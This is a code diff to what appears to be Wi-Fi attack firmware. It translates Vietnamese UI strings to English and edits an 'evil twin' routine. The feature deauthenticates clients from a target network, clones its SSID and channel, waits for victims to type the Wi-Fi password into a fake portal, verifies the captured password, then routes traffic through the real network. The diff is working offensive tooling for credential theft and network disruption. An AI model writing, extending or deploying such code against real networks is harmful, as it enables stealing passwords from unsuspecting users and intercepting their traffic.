@@ -27722,15 +27722,15 @@ index 0000000..c22391b
 +    int choice=-1;
 +    options = {
 +        {hasPick ? (String("Target: ") + targetSsid + " CH" + String(targetCh) + " (from scan)")
-+                 : String("Target: <chọn từ Scan & Analyze trước>"), [&]() { choice = 0; }},
-+        {"Nhập SSID thủ công", [&]() { choice=1; }},
-+        {String("Bắt đầu Deauth+Clone+Verify+Route")+ (hasPick?"": " (cần target)"), [&]() { choice=2; }},
++                 : String("Target: <run Scan & Analyze first>"), [&]() { choice = 0; }},
++        {"Enter SSID manually", [&]() { choice=1; }},
++        {String("Start Deauth+Clone+Verify+Route")+ (hasPick?"": " (need target)"), [&]() { choice=2; }},
 +        {"Back", [&]() { choice=-1; }},
 +    };
 +    loopOptions(options, MENU_TYPE_SUBMENU, "Deauth+Clone+Verify+Route");
 +    options.clear();
 +    if (choice==0 && hasPick) {
-+        displayInfo(String("Đã chọn: ")+targetSsid+" CH"+String(targetCh)+"\nBấm Back rồi chọn Bắt đầu", true);
++        displayInfo(String("Selected: ")+targetSsid+" CH"+String(targetCh)+"\nPress Back then Start", true);
 +        return;
 +    }
 +    if (choice==1) {
@@ -27744,7 +27744,7 @@ index 0000000..c22391b
 +        choice=2;
 +    }
 +    if (choice!=2) return;
-+    if (!hasPick) { displayWarning("Chưa có target. Hãy chạy Scan & Analyze hoặc nhập SSID.", true); return; }
++    if (!hasPick) { displayWarning("No target. Run Scan & Analyze or enter SSID.", true); return; }
 +    // Need uplink - try to use saved wifi or ask user to have connected once
 +    String uplinkSsid, uplinkPwd;
 +    // We will use portalNaptStartEvilTwin which handles fallback to verified creds
@@ -27755,7 +27755,7 @@ index 0000000..c22391b
 +    if (!ok) { displayError(String("Start failed: ")+err, true); chainLog("evil-twin-route","start",false,err); return; }
 +    markActive(CHAIN_EVIL_TWIN);
 +    chainLog("evil-twin-route","start",true,targetSsid+" CH"+String(targetCh)+" deauth+clone+verify+route");
-+    displaySuccess(String("Đang chạy: ")+targetSsid+"\nDeauth+Clone+Verify+Route\nĐợi nạn nhân nhập pass -> sẽ tự Route ra mạng thật", true);
++    displaySuccess(String("Running: ")+targetSsid+"\nDeauth+Clone+Verify+Route\nWait for pass -> auto Route", true);
 +}
 +
 +static void usbVerifyMenu() {
@@ -33584,18 +33584,9 @@ index 0000000..9067c2a
 +
 +bool portalNaptStartEvilTwin(const String &targetSsid, uint8_t targetChannel, const String &staSsid, const String &staPwd, String *errOut) {
 +    // Deauth + Clone (same SSID/channel) + Verify + Route (NAPT via captured creds)
-+    // Route uses target network; if staSsid empty we will use verified password after capture.
++    // Do not require an existing STA uplink at start; handoff will use the verified password.
 +    String uplinkSsid = staSsid.length() ? staSsid : targetSsid;
 +    String uplinkPwd = staPwd;
-+    // If no STA pwd provided, we still start portal with Verify=ON; handoff will use verified pwd.
-+    if (uplinkPwd.isEmpty()) {
-+        // Need at least a placeholder STA to start portal; will be replaced by verified creds on handoff.
-+        // Use saved wifi if available, otherwise start with same SSID and empty pwd (will fail until verify).
-+        if (!pickUplink(uplinkSsid, uplinkPwd)) {
-+            uplinkSsid = targetSsid;
-+            uplinkPwd = "";
-+        }
-+    }
 +    return startEngineEx(targetSsid, targetChannel, true, true, uplinkSsid, uplinkPwd, true, errOut);
 +}
 +
